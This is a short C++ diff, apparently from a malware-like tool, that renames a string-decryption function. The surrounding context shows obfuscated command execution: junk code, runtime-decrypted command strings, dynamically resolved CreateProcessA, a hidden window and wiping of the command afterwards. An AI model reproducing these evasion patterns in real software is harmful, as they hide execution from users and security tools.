@@ -42,7 +42,7 @@ namespace {
 		if (garbage % 5 == 0)
 			junk();
 		
-		std::string cmdDecrypted = string_decrypt(cmd_string) + command;
+		std::string cmdDecrypted = decrypt_string(cmd_string) + command;
 
 		// Create the child process and run the command line (Wipe the command as soon as CreateProcessA() returns)
 		bool result = resolve_dynamically<CreateProcessA_t>(str_CreateProcessA)(NULL, (char*)cmdDecrypted.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo);
